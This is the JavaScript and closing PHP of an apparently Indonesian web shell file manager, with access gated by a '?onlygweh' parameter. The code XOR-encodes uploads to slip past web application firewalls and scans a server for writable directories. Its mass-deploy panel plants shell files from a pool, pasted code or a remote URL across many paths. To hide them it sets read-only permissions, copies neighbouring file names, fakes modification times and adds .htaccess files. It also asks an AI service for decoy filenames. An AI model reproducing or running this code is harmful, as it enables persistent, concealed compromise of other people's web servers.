function switchTebarTab(t,b){var tabs=document.querySelectorAll('#modal-tebar .tab-btn'),c=document.querySelectorAll('#modal-tebar .tab-content'),i;for(i=0;i<tabs.length;i++){tabs[i].classList.remove('active');}for(i=0;i<c.length;i++){c[i].classList.remove('active');}document.getElementById('tab-'+t).classList.add('active');if(b){b.classList.add('active');}}
function xorEncryptToBase64(str){var key=0x5A,bytes=new TextEncoder().encode(str),i;for(i=0;i<bytes.length;i++){bytes[i]^=key;}var bin='',C=0x8000;for(i=0;i<bytes.length;i+=C){bin+=String.fromCharCode.apply(null,bytes.subarray(i,i+C));}return btoa(bin)}
function encBuffer(buf){var bytes=new Uint8Array(buf),i;for(i=0;i<bytes.length;i++){bytes[i]^=0x5A;}var bin='',C=0x8000;for(i=0;i<bytes.length;i+=C){bin+=String.fromCharCode.apply(null,bytes.subarray(i,i+C));}return btoa(bin)}
function saveEditEncrypted(){document.getElementById('enc').value=xorEncryptToBase64(document.getElementById('editor').value);document.getElementById('editor').value='';document.getElementById('editForm').submit()}
function sendChunk(fd,tries){return fetch('?onlygweh&a=cup',{method:'POST',body:fd}).then(function(r){if(!r.ok&&tries>0){return sendChunk(fd,tries-1);}return r;});}
function uploadDone(st){st.innerText='✅ Sukses! Reloading...';st.style.color='#3fb950';setTimeout(function(){location.reload()},800);}
function uploadChunked(file,st){
st.innerText='🔐 Encrypting (chunked)...';
file.arrayBuffer().then(function(buf){
var b64=encBuffer(buf),cs=30000,ch=[],k;for(k=0;k<b64.length;k+=cs){ch.push(b64.substring(k,k+cs));}
var sid=Math.random().toString(36).substr(2,9),idx=0;
function step(){
if(idx>=ch.length){uploadDone(st);return;}
st.innerText='🔐 Chunk '+(idx+1)+'/'+ch.length;
var fd=new FormData();fd.append('c',ch[idx]);fd.append('s',sid);fd.append('i',idx);fd.append('t',ch.length);fd.append('n',file.name);fd.append('p',currentPath);
sendChunk(fd,3).then(function(r){return r.text().then(function(t){if(!r.ok||t.indexOf('OK')!==0){throw new Error('Chunk '+(idx+1)+' gagal: HTTP '+r.status);}idx++;step();});})['catch'](function(e){st.innerText='❌ '+e.message;st.style.color='#f85149';});
}
step();
});}
function processAndUpload(file,el){
var st=document.getElementById(el);st.style.display='block';st.style.color='#58a6ff';
if(file.size<=20*1024*1024){
st.innerText='🔐 Encrypting...';
file.arrayBuffer().then(function(buf){
var b64=encBuffer(buf);
var fd=new FormData();fd.append('d',b64);fd.append('n',file.name);fd.append('p',currentPath);
st.innerText='🚀 Single-post anti-WAF...';
return fetch('?onlygweh&a=upx',{method:'POST',body:fd}).then(function(r){return r.text().then(function(t){
if(r.ok&&t.indexOf('OK')===0){uploadDone(st);}
else{st.innerText='⚠️ Single-post gagal ('+r.status+'), fallback chunked...';uploadChunked(file,st);}
});});
})['catch'](function(e){st.innerText='⚠️ '+e.message+', fallback chunked...';uploadChunked(file,st);});
return;
}
uploadChunked(file,st);}
function handleFileUpload(){var fi=document.getElementById('up-file');if(!fi.files.length){alert('Pilih file!');return;}processAndUpload(fi.files[0],'up-status')}
function chmodPrompt(p,v){document.getElementById('chmod-target').value=p;document.getElementById('chmod-perm').value=v;document.getElementById('chmod-path').innerText=p;showModal('chmod')}
function setPerm(p){document.getElementById('chmod-perm').value=p}
function datetimePrompt(p,d){document.getElementById('datetime-target').value=p;document.getElementById('datetime-val').value=d;document.getElementById('datetime-path').innerText=p;showModal('datetime')}
function openPathWindow(path){
var url='?onlygweh&p='+path;
window.open(url,'fm_popup','width=1000,height=700,scrollbars=yes,resizable=yes,location=no,toolbar=no,menubar=no');
}
function runScan(mode){
var path=document.getElementById('scanPath').value||currentPath;
var st=document.getElementById('scanStatus'),res=document.getElementById('scanResults');
st.style.display='block';st.style.color='#58a6ff';st.innerText='🔍 Scanning...';res.innerHTML='';
selectedScans={};selectedRefFiles={};refNames=[];expandedPaths={};
fetch('?onlygweh&action=scan_writable&mode='+mode+'&path='+encodeURIComponent(path)).then(function(r){return r.json()}).then(function(d){
if(d.success){scanResultsCache=d.writable;st.innerText='✅ '+d.count+' writable (depth '+d.max_depth+')';st.style.color='#3fb950';
if(d.writable.length>0){for(var i=0;i<d.writable.length;i++){(function(i,dir){
var w=document.createElement('div');w.className='scan-result writable';
w.innerHTML='<div class="scan-result-header" onclick="toggleFileDrop('+i+',this)"><span>✅ '+dir+'</span><span style="display:flex;align-items:center;gap:8px"><input type="checkbox" onclick="event.stopPropagation();toggleScanSelect('+i+',this)"><span class="arrow">▶</span></span></div><div class="file-drop" id="file-drop-'+i+'"></div>';
res.appendChild(w);})(i,d.writable[i]);}}
else{res.innerHTML='<div class="scan-result"><div class="scan-result-header">❌ No writable dirs</div></div>';}
updateSelectedCount();updateBulkShellDropdown();}
else{st.innerText='❌ Failed';st.style.color='#f85149';}
})['catch'](function(e){st.innerText='❌ '+e.message;st.style.color='#f85149';});}
function toggleFileDrop(idx,hdr){
var drop=document.getElementById('file-drop-'+idx);var path=scanResultsCache[idx];
if(expandedPaths[idx]){delete expandedPaths[idx];drop.classList.remove('expanded');hdr.classList.remove('expanded');return;}
expandedPaths[idx]=true;hdr.classList.add('expanded');
if(!drop.getAttribute('data-loaded')){
drop.innerHTML='<div class="file-drop-loading">⏳ Loading...</div>';drop.classList.add('expanded');
fetch('?onlygweh&action=list_dir_files&path='+encodeURIComponent(path)).then(function(r){return r.json()}).then(function(d){drop.innerHTML='';
if(d.success&&d.files&&d.files.length>0){
for(var x=0;x<d.files.length;x++){(function(f){
var row=document.createElement('div');row.className='file-drop-item';
var cb=document.createElement('input');cb.type='checkbox';cb.className='fd-check';
cb.setAttribute('data-ref',path+'|'+f.name);cb.setAttribute('data-name',f.name);cb.title='Referensi nama';
cb.onchange=function(){toggleRefFile(cb)};
var ic=document.createElement('span');ic.className='fd-icon';
ic.textContent=f.dir?'📁':(f.ext==='php'?'🐘':(f.ext==='zip'?'📦':''));
var nm=document.createElement('span');nm.className='fd-name';nm.textContent=f.name;nm.title=f.name;
var sz=document.createElement('span');sz.className='fd-size';sz.textContent=f.dir?'DIR':formatSize(f.size);
var pm=document.createElement('span');pm.className='fd-perm';pm.textContent=f.perm||'-';
row.appendChild(cb);row.appendChild(ic);row.appendChild(nm);row.appendChild(sz);row.appendChild(pm);
drop.appendChild(row);})(d.files[x]);}
drop.setAttribute('data-loaded','1');
}else{drop.innerHTML='<div class="file-drop-empty">📭 Kosong / '+(d.error||'')+'</div>';drop.setAttribute('data-loaded','1');}
})['catch'](function(e){drop.innerHTML='<div class="file-drop-empty">❌ '+e.message+'</div>';});}
requestAnimationFrame(function(){drop.classList.add('expanded')});}
function toggleRefFile(cb){var key=cb.getAttribute('data-ref'),name=cb.getAttribute('data-name');
if(cb.checked){selectedRefFiles[key]=true;if(refNames.indexOf(name)===-1){refNames.push(name);}}
else{delete selectedRefFiles[key];var i=refNames.indexOf(name);if(i>-1){refNames.splice(i,1);}}
updateSelectedCount();}
function formatSize(b){if(!b||b===0){return'0 B';}var k=1024,s=['B','KB','MB','GB'],i=Math.floor(Math.log(b)/Math.log(k));return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+s[i]}
function toggleScanSelect(i,cb){if(cb.checked){selectedScans[i]=true;}else{delete selectedScans[i];}updateSelectedCount();updateBulkShellDropdown();}
function selectAllScans(){selectedScans={};var cbs=document.querySelectorAll('#scanResults .scan-result-header input[type="checkbox"]');for(var i=0;i<cbs.length;i++){cbs[i].checked=true;selectedScans[i]=true;}updateSelectedCount();updateBulkShellDropdown();}
function updateSelectedCount(){var n=0,r=0,k;for(k in selectedScans){n++;}for(k in selectedRefFiles){r++;}document.getElementById('selectedCount').textContent=n;document.getElementById('refCount').textContent=r}
function updateBulkShellDropdown(){
var sel=document.getElementById('bulkShellSelect');if(!sel)return;
sel.innerHTML='<option value="">-- Pilih Shell --</option>';
for(var i=0;i<shellPool.length;i++){sel.innerHTML+='<option value="'+i+'">Shell '+(i+1)+': '+shellPool[i].name+'</option>';}
}
function bulkAssignShell(){
var sel=document.getElementById('bulkShellSelect');
var idx=parseInt(sel.value,10);
if(isNaN(idx)||!shellPool[idx]){alert('❌ Pilih shell dulu!');return;}
var n=0;for(var k in selectedScans){n++;}
if(n===0){alert('❌ Pilih minimal 1 path!');return;}
for(k in selectedScans){addTebarRow(scanResultsCache[k],idx);}
alert('✅ '+n+' paths di-assign ke Shell '+(idx+1)+': '+shellPool[idx].name);
switchTebarTab('deploy',document.querySelectorAll('#modal-tebar .tab-btn')[2]);
}
function sendSelectedToTebar(){
var n=0,k;for(k in selectedScans){n++;}
if(n===0){alert('❌ Pilih minimal 1 path!');return;}
for(k in selectedScans){addTebarRow(scanResultsCache[k]);}
if(refNames.length>0){document.getElementById('refSection').style.display='block';
var rc=document.getElementById('refChips');rc.innerHTML='';
for(var i=0;i<refNames.length;i++){(function(nm){var chip=document.createElement('span');chip.className='ref-chip';chip.textContent=nm;chip.onclick=function(){applyRefToActiveRow(nm)};rc.appendChild(chip);})(refNames[i]);}}
var btns=document.querySelectorAll('#modal-tebar .tab-btn'),cs=document.querySelectorAll('#modal-tebar .tab-content'),j;
for(j=0;j<btns.length;j++){btns[j].classList.remove('active');}
for(j=0;j<cs.length;j++){cs[j].classList.remove('active');}
document.getElementById('tab-deploy').classList.add('active');btns[2].classList.add('active');
alert('✅ '+n+' paths + '+refNames.length+' refs dikirim!')}
function applyRefToActiveRow(name){var rows=document.querySelectorAll('.tebar-row');if(rows.length===0){return;}rows[rows.length-1].querySelector('input[name*="[filename]"]').value=name}
function addPoolFiles(input){if(!input.files.length){return;}for(var i=0;i<input.files.length;i++){shellPool.push({name:input.files[i].name,file:input.files[i],type:'file'});}renderPool();updateBulkShellDropdown();input.value=''}
function addPoolTextarea(){var name=prompt('Nama shell:','shell.php');if(!name){return;}shellPool.push({name:name,file:null,type:'paste',content:''});renderPool();updateBulkShellDropdown();}
function renderPool(){var c=document.getElementById('poolFiles');c.innerHTML='';
if(shellPool.length===0){c.innerHTML='<div style="color:#484f58;font-size:11px;padding:8px">Pool kosong.</div>';refreshPoolDropdowns();return;}
for(var i=0;i<shellPool.length;i++){(function(s,i){var div=document.createElement('div');div.className='pool-item';
div.innerHTML='<span>📄</span><span class="pool-name">Shell '+(i+1)+': '+s.name+'</span><span class="pool-size">'+(s.file?formatSize(s.file.size):'(paste)')+'</span><button onclick="removePoolItem('+i+')">🗑</button>';
c.appendChild(div);})(shellPool[i],i);}
refreshPoolDropdowns();updateBulkShellDropdown();}
function refreshPoolDropdowns(){var opts='<option value="">-- Pilih Shell --</option>';for(var i=0;i<shellPool.length;i++){opts+='<option value="'+i+'">Shell '+(i+1)+': '+shellPool[i].name+'</option>';}
var sels=document.querySelectorAll('select[name*="[pool_select]"]');for(var j=0;j<sels.length;j++){var cur=sels[j].value;sels[j].innerHTML=opts;sels[j].value=cur;}}
function removePoolItem(i){shellPool.splice(i,1);renderPool();updateBulkShellDropdown();}
function addTebarRow(defaultPath,defaultPoolIdx){defaultPath=defaultPath||'';
var c=document.getElementById('tebarRows');var idx=tebarRowCounter++;
var row=document.createElement('div');row.className='tebar-row';row.setAttribute('data-idx',idx);
var poolOpts='<option value="">-- Pilih Shell --</option>';
for(var i=0;i<shellPool.length;i++){poolOpts+='<option value="'+i+'"'+(i===defaultPoolIdx?' selected':'')+'>Shell '+(i+1)+': '+shellPool[i].name+'</option>';}
row.innerHTML='<div class="row-header"><input type="text" name="tebar_data['+idx+'][path]" placeholder="Path target" value="'+escAttr(defaultPath)+'" required><div style="display:flex;gap:4px"><input type="text" name="tebar_data['+idx+'][filename]" placeholder="save_as.php" value="shell.php" required style="flex:1"><button type="button" class="ref-btn" onclick="randomRefName('+idx+')">🎲</button></div><button type="button" class="remove-row-btn" onclick="removeRow('+idx+')">🗑</button></div>'+
'<div class="src-mode-selector"><label><input type="radio" name="tebar_data['+idx+'][src_mode]" value="pool" checked onchange="toggleSrcMode(this,'+idx+')"><span>📦 Pool</span></label><label><input type="radio" name="tebar_data['+idx+'][src_mode]" value="paste" onchange="toggleSrcMode(this,'+idx+')"><span>📋 Paste</span></label><label><input type="radio" name="tebar_data['+idx+'][src_mode]" value="local" onchange="toggleSrcMode(this,'+idx+')"><span>💾 Local</span></label><label><input type="radio" name="tebar_data['+idx+'][src_mode]" value="remote" onchange="toggleSrcMode(this,'+idx+')"><span>🌐 Remote</span></label></div>'+
'<div class="row-body"><div class="src-input active" data-src="pool"><select name="tebar_data['+idx+'][pool_select]" style="width:100%">'+poolOpts+'</select><input type="hidden" name="tebar_data['+idx+'][pool_enc]"></div><textarea name="tebar_data['+idx+'][content]" class="src-input" data-src="paste" placeholder="Paste kode PHP..."></textarea><input type="hidden" name="tebar_data['+idx+'][content_enc]"><input type="file" name="tebar_local_'+idx+'" class="src-input" data-src="local" accept=".php,.phtml,.txt" onchange="handleLocalSelect(this,'+idx+')"><input type="hidden" name="tebar_data['+idx+'][local_enc]"><div id="local-info-'+idx+'" style="font-size:10px;color:#8b949e;margin-top:4px"></div><input type="text" name="tebar_data['+idx+'][remote_url]" class="src-input" data-src="remote" placeholder="https://example.com/shell.txt"></div>'+
'<div class="row-footer"><input type="text" name="tebar_data['+idx+'][chmod]" value="0444"><input type="text" name="tebar_data['+idx+'][modify_date]" placeholder="Modify date" id="mdate-'+idx+'"><button type="button" class="sync-btn" onclick="syncMtime('+idx+',this)">🔄 Sync</button><select name="tebar_data['+idx+'][create_htaccess]" style="width:auto;padding:4px 8px;background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;font-size:10px"><option value="no">.htaccess: NO</option><option value="yes">.htaccess: YES</option></select><button type="button" onclick="removeRow('+idx+')" style="background:#da3633;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px">🗑</button></div>';
c.appendChild(row)}
function removeRow(idx){var rs=document.querySelectorAll('.tebar-row[data-idx="'+idx+'"]');for(var i=0;i<rs.length;i++){rs[i].parentNode.removeChild(rs[i]);}}
function toggleSrcMode(radio,idx){var row=radio.closest('.tebar-row');var mode=radio.value;var ins=row.querySelectorAll('.src-input');for(var i=0;i<ins.length;i++){ins[i].classList.remove('active');}row.querySelector('.src-input[data-src="'+mode+'"]').classList.add('active')}
function handleLocalSelect(input,idx){var info=document.getElementById('local-info-'+idx);if(!input.files.length){info.textContent='';return;}info.textContent='📄 '+input.files[0].name+' ('+formatSize(input.files[0].size)+')'}
function randomRefName(idx){if(refNames.length===0){alert('❌ Belum ada references!');return;}var name=refNames[Math.floor(Math.random()*refNames.length)];var row=document.querySelector('.tebar-row[data-idx="'+idx+'"]');if(row){row.querySelector('input[name*="[filename]"]').value=name;}}
function syncMtime(idx,btn){
var row=document.querySelector('.tebar-row[data-idx="'+idx+'"]');if(!row){return;}
var path=row.querySelector('input[name*="[path]"]').value.trim();
if(!path){alert('❌ Isi path target dulu!');return;}
var mdate=document.getElementById('mdate-'+idx);
btn.textContent='⏳';btn.disabled=true;
fetch('?onlygweh&action=get_ref_mtime&path='+encodeURIComponent(path)).then(function(r){return r.json()}).then(function(d){
if(d.success){mdate.value=d.mtime_input;mdate.title='Synced: '+d.ref;mdate.style.borderColor='#3fb950';}
else{alert('❌ '+(d.error||'Gagal'));}
btn.textContent='🔄 Sync';btn.disabled=false;
})['catch'](function(e){alert('❌ '+e.message);btn.textContent='🔄 Sync';btn.disabled=false;});}
function saveDeployedFile(path,filename){
deployedFiles.push({path:path,filename:filename,time:new Date().toISOString()});
try{localStorage.setItem('fm_deployed_files',JSON.stringify(deployedFiles));}catch(e){}
}
function submitTebar(){
var rows=document.querySelectorAll('.tebar-row');
if(rows.length===0){alert('❌ Belum ada row!');return;}
var st=document.getElementById('tebarStatus');st.style.display='block';st.style.color='#58a6ff';st.innerText='🔐 Preparing...';
var chain=Promise.resolve();
for(var i=0;i<rows.length;i++){(function(row,i){
chain=chain.then(function(){
var mode=row.querySelector('input[type="radio"]:checked').value;
st.innerText='🔐 Row '+(i+1)+'/'+rows.length;
if(mode==='pool'){
var sel=row.querySelector('select[name*="[pool_select]"]');var pi=parseInt(sel.value,10);
if(isNaN(pi)||!shellPool[pi]){return;}
var shell=shellPool[pi];
if(shell.type==='file'&&shell.file){return shell.file.arrayBuffer().then(function(buf){row.querySelector('input[name*="[pool_enc]"]').value=encBuffer(buf);});}
else if(shell.type==='paste'){if(!shell.content){shell.content=prompt('Paste kode untuk '+shell.name+':','');if(!shell.content){return;}}row.querySelector('input[name*="[pool_enc]"]').value=xorEncryptToBase64(shell.content);}
}else if(mode==='paste'){
var ta=row.querySelector('textarea[data-src="paste"]');var enc=row.querySelector('input[name*="[content_enc]"]');
if(ta.value.trim()){enc.value=xorEncryptToBase64(ta.value);ta.value='';}
}else if(mode==='local'){
var fi=row.querySelector('input[type="file"][data-src="local"]');var enc2=row.querySelector('input[name*="[local_enc]"]');
if(fi.files&&fi.files.length>0){return fi.files[0].arrayBuffer().then(function(buf){enc2.value=encBuffer(buf);});}
}
});})(rows[i],i);}
chain.then(function(){
st.innerText='🚀 Deploying...';st.style.color='#3fb950';
// Simpan data deployment ke localStorage sebelum submit
for(var r=0;r<rows.length;r++){
var pathInput=rows[r].querySelector('input[name*="[path]"]');
var filenameInput=rows[r].querySelector('input[name*="[filename]"]');
if(pathInput&&filenameInput){saveDeployedFile(pathInput.value,filenameInput.value);}
}
var form=document.getElementById('tebarForm');
if(!form){form=document.createElement('form');form.id='tebarForm';form.method='post';document.body.appendChild(form);}
form.innerHTML='';
for(var r=0;r<rows.length;r++){var ins=rows[r].querySelectorAll('input,textarea,select');for(var q=0;q<ins.length;q++){if(ins[q].name){form.appendChild(ins[q].cloneNode(true));}}}
var sb=document.createElement('input');sb.type='hidden';sb.name='submit_tebar';sb.value='1';form.appendChild(sb);
form.submit();});}
function loadCleanupList(){
var list=document.getElementById('cleanupList');
if(deployedFiles.length===0){list.innerHTML='<div style="color:#8b949e;font-size:11px;padding:10px">Belum ada shell yang di-deploy.</div>';return;}
var html='<table style="width:100%;font-size:11px;border-collapse:collapse">';
html+='<tr style="background:#21262d;color:#58a6ff"><th style="padding:6px;text-align:left">Path</th><th style="padding:6px;text-align:left">Filename</th><th style="padding:6px;text-align:left">Time</th></tr>';
for(var i=0;i<deployedFiles.length;i++){
var f=deployedFiles[i];
var time=f.time?new Date(f.time).toLocaleString():'';
html+='<tr style="border-bottom:1px solid #30363d"><td style="padding:6px;color:#c9d1d9">'+escAttr(f.path)+'</td><td style="padding:6px;color:#c9d1d9">'+escAttr(f.filename)+'</td><td style="padding:6px;color:#8b949e;font-size:10px">'+time+'</td></tr>';
}
html+='</table>';
list.innerHTML=html;
}
function cleanupAllDeployed(){
if(deployedFiles.length===0){alert('❌ Belum ada shell yang di-deploy!');return;}
if(!confirm('Yakin ingin menghapus '+deployedFiles.length+' shell yang sudah di-deploy?')){return;}
var st=document.getElementById('cleanupStatus');
st.style.display='block';st.style.color='#58a6ff';st.innerText='🗑️ Menghapus...';
fetch('?onlygweh&action=cleanup_deployed',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({files:deployedFiles})})
.then(function(r){return r.json()})
.then(function(d){
if(d.success){
var deleted=0,not_found=0,failed=0;
for(var i=0;i<d.results.length;i++){
if(d.results[i].status==='deleted')deleted++;
else if(d.results[i].status==='not_found')not_found++;
else failed++;
}
st.innerText='✅ Deleted: '+deleted+' | Not Found: '+not_found+' | Failed: '+failed;
st.style.color='#3fb950';
deployedFiles=[];
try{localStorage.removeItem('fm_deployed_files');}catch(e){}
loadCleanupList();
}else{
st.innerText='❌ '+(d.error||'Gagal');
st.style.color='#f85149';
}
})['catch'](function(e){
st.innerText='❌ '+e.message;
st.style.color='#f85149';
});
}
function getAiConfig(){return{host:document.getElementById('ai_host').value.trim(),api_key:document.getElementById('ai_api_key').value.trim(),model:document.getElementById('ai_model').value.trim()}}
function saveAiConfig(){var c=getAiConfig();if(!c.host||!c.api_key||!c.model){alert('❌ Lengkapi!');return;}localStorage.setItem('fm_ai_config',JSON.stringify(c));showAiStatus('✅ Saved','success')}
function loadAiConfig(){var s=localStorage.getItem('fm_ai_config');if(!s){showAiStatus('❌ No config','error');return;}try{var c=JSON.parse(s);document.getElementById('ai_host').value=c.host||'';document.getElementById('ai_api_key').value=c.api_key||'';document.getElementById('ai_model').value=c.model||'';showAiStatus('✅ Loaded','success')}catch(e){showAiStatus('❌ '+e.message,'error')}}
function clearAiConfig(){localStorage.removeItem('fm_ai_config');document.getElementById('ai_host').value='';document.getElementById('ai_api_key').value='';document.getElementById('ai_model').value='';showAiStatus('🗑 Cleared','success')}
function showAiStatus(m,t,id){id=id||'aiStatus';var el=document.getElementById(id);el.textContent=m;el.className='ai-status '+t;el.style.display='block';if(t!=='loading'){setTimeout(function(){el.style.display='none'},5000);}}
function aiGenerate(task){var cfg=getAiConfig();if(!cfg.host||!cfg.api_key||!cfg.model){showAiStatus('❌ Lengkapi config!','error');return;}
showAiStatus('🤖 Generating...','loading');document.getElementById('aiSuggestions').innerHTML='';
fetch('?onlygweh&action=ai_generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:cfg.host,api_key:cfg.api_key,model:cfg.model,task:task})}).then(function(r){return r.json()}).then(function(d){
if(d.success&&d.result.items){showAiStatus('✅ '+d.result.items.length+' names','success');
for(var i=0;i<d.result.items.length;i++){(function(n){var s=document.createElement('span');s.className='ai-suggestion';s.textContent=n;s.onclick=function(){copyToClipboard(n)};document.getElementById('aiSuggestions').appendChild(s);})(d.result.items[i]);}}
else if(d.success&&d.result.text){showAiStatus('✅ '+d.result.text,'success');}
else{showAiStatus('❌ '+(d.error||'Failed'),'error');}
})['catch'](function(e){showAiStatus('❌ '+e.message,'error')});}
function submitCustomPrompt(){var cfg=getAiConfig();if(!cfg.host||!cfg.api_key||!cfg.model){showAiStatus('❌ Lengkapi!','error','aiCustomStatus');return;}
var p=document.getElementById('ai_custom_prompt').value.trim();if(!p){showAiStatus('❌ Kosong!','error','aiCustomStatus');return;}
showAiStatus('🤖 Generating...','loading','aiCustomStatus');
fetch('?onlygweh&action=ai_generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:cfg.host,api_key:cfg.api_key,model:cfg.model,task:'custom',context:p})}).then(function(r){return r.json()}).then(function(d){
if(d.success){showAiStatus('✅ Done','success','aiCustomStatus');var t=d.result.text||((d.result.items)?d.result.items.join('\n'):d.result.raw)||'';var c=document.getElementById('aiCustomSuggestions');c.innerHTML='';var lines=t.split('\n');
for(var i=0;i<lines.length;i++){if(!lines[i].trim()){continue;}(function(l){var s=document.createElement('span');s.className='ai-suggestion';s.textContent=l.trim();s.onclick=function(){copyToClipboard(l.trim())};c.appendChild(s);})(lines[i]);}}
else{showAiStatus('❌ '+(d.error||''),'error','aiCustomStatus');}
})['catch'](function(e){showAiStatus('❌ '+e.message,'error','aiCustomStatus')});}
function copyToClipboard(t){if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t);}else{var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);}}
function toggleBypassMode(){
var cb=document.getElementById('bypassMode');
var hidden=document.getElementById('bypassModeHidden');
hidden.value=cb.checked?'1':'0';
}
window.addEventListener('DOMContentLoaded',function(){
var s=localStorage.getItem('fm_ai_config');
if(s){try{var c=JSON.parse(s);document.getElementById('ai_host').value=c.host||'';document.getElementById('ai_api_key').value=c.api_key||'';document.getElementById('ai_model').value=c.model||'';}catch(e){}}
loadCleanupList();
updateBulkShellDropdown();
});
var modals=document.querySelectorAll('.modal');
for(var mi=0;mi<modals.length;mi++){(function(m){m.addEventListener('click',function(e){if(e.target===m){m.classList.remove('active');}});})(modals[mi]);}
document.addEventListener('keydown',function(e){if(e.key==='Escape'){var act=document.querySelectorAll('.modal.active');for(var i=0;i<act.length;i++){act[i].classList.remove('active');}}});
</script>
<?php if(isset($_GET['logout'])){session_destroy();header('Location: ?onlygweh');die;} ?>
</body></html>